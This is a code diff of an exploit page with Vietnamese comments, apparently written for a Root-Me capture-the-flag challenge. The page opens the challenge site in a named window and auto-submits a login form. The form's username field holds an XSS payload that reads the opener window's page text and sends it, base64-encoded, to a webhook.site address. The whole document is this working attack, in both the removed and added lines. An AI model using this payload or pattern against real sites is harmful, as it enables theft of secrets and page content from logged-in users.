@@ -1,25 +1,28 @@
 <script>
-    // 1. Mở trang chủ của challenge (nơi Admin đang đăng nhập và có Secret)
-    // Giả sử trang đó là /
-    const adminWindow = window.open("http://challenge01.root-me.org:58003/");
+    // 1. Mở trang CHỨA SECRET trước (Trang chủ/Profile của Admin)
+    // Đặt tên cho cửa sổ này là 'secret_window'
+    var win = window.open("http://challenge01.root-me.org:58003/", "secret_window");
 
-    // 2. Sau 1 giây, điều hướng trang web của chính mình (Attacker) 
-    // sang trang login nhưng với một Form tự động Submit payload XSS
+    // 2. Chờ một chút để trang Secret load xong
     setTimeout(() => {
+        // 3. Điều hướng CHÍNH CỬA SỔ ĐÓ sang trang Login bằng POST
+        // Khi trang Login hiện ra, 'opener' của nó vẫn sẽ là trang exploit này
+        // HOẶC nếu trang Login là trang con, 'opener' sẽ là trang Secret.
+        
         const form = document.createElement('form');
         form.method = 'POST';
         form.action = 'http://challenge01.root-me.org:58003/login';
+        form.target = "secret_window"; // Cực kỳ quan trọng: Submit vào đúng cửa sổ đó
 
         const input = document.createElement('input');
         input.type = 'hidden';
         input.name = 'username';
         
-        // Payload này thực thi trên origin của challenge
-        // Nó sẽ đọc innerText của 'opener' (là cái adminWindow chúng ta mở ở bước 1)
-        input.value = `<img src=x onerror="fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce/?secret=' + btoa(opener.document.body.innerText))">`;
+        // Payload: Thử dùng top.window.opener hoặc window.opener
+        input.value = `<img src=x onerror="fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?s='+btoa(window.opener.document.body.innerText))">`;
 
         form.appendChild(input);
         document.body.appendChild(form);
         form.submit();
-    }, 1000);
+    }, 2000);
 </script>
